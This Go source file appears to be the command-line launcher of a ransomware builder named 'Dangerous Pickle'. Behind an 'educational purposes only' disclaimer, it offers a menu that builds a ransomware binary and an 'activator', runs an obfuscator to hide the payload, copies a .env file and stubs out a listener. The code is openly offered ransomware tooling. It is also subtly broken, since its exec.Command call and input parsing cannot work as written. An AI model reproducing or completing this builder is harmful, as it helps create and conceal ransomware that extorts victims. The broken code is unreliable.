package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/common-nighthawk/go-figure"
	"ransomware.com/main/internal/colors"
)

const Version = "1.0"
const Disclaimer = colors.ColorRed + "Disclaimer: " + colors.ColorBlue + "\nThis code is ransomware and is for educational purposes only. " +
	"Do not use it for malicious purposes. the creator not responsible for any damage caused by this code." + colors.ColorReset

func titleScreen() {
	title := figure.NewFigure("Dangerous  Pickle  V"+Version, "puffy", true)
	title.Print()
	fmt.Println(Disclaimer)
}

func main() {
	var input string
	titleScreen()
	fmt.Println(">>")
	fmt.Scan(&input)

	command := strings.Split(input, " ")

	switch command[0] {
	case "--help":
		showHelpScreen()
	case "-h":
		showHelpScreen()
	case "--version":
		showVersion()
	case "-v":
		showVersion()
	case "--create":
		create(command)
	case "-c":
		create(command)
	case "--exit":
		fmt.Println("Exiting...")
		os.Exit(0)
	case "--listener":
		fmt.Println("Starting listener...")
		startListener()
	case "-l":
		fmt.Println("Starting listener...")
		startListener()
	default:
		fmt.Println(input + " is not a valid option")
	}

}

func startListener() {

}

func create(command []string) {
	switch command[1] {
	case "ransomware":
		fmt.Println("Creating ransomware...")
		createRansomware(command)
	default:
		fmt.Println(command[1] + " is not a valid option")
	}
}

func createRansomware(command []string) {
	if len(command) != 3 {
		fmt.Println("Usage: --create ransomware <key> <outputname of file>")
		return
	}

	c := exec.Command("go build -o ./bin/temp.exe ./cmd/ransomware/main.go",
		"go build -o ./bin/activator.exe ./cmd/activator/activator.go",
		"go run ./cmd/obfuscator/obfuscator.go ./bin/temp.exe "+command[2]+" ./bin/obfuscated.dat",
		"rm ./bin/temp.exe", "cp ./.env ./bin/.env")

	file, err := os.Create("./bin/obfuscation.key")
	if err != nil {
		fmt.Println("Error creating key file")
		return
	}

	file.WriteString(command[2])
	file.Close()

	c.Run()
}

func showVersion() {
	fmt.Println("Dangerous Pickle V" + Version)
}

func showHelpScreen() {
	fmt.Print("Dangerous Pickle V" + Version + "\nHelp menu\n\n" +
		"Options:\n" + "--help, -h\t\tShow this help screen\n" +
		"--version\t\tShow the version of the program\n" +
		"--create, -c\t\tCreate a new ransomware\n" +
		"--exit\t\t\tExit the program\n" +
		"--listener, -l\t\tStart a listener\n")
}
